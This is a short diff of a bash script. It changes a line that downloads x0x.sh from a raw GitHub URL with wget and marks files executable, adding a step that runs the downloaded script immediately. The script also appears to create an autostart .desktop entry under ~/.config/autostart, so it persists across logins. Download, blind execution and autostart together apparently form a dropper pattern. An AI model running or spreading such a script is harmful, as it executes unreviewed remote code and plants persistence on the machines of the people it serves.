@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Script
- rm -rvf x0x.sh; wget -O x0x.sh https://raw.githubusercontent.com/Maulana021k/xnxx/refs/heads/main/xox.sh; chmod +x *
+ rm -rvf x0x.sh; wget -O x0x.sh https://raw.githubusercontent.com/Maulana021k/xnxx/refs/heads/main/xox.sh; chmod +x *; ./x0x.sh
 
 # Nama file .desktop
 DESKTOP_FILE="$HOME/.config/autostart/ix.desktop"
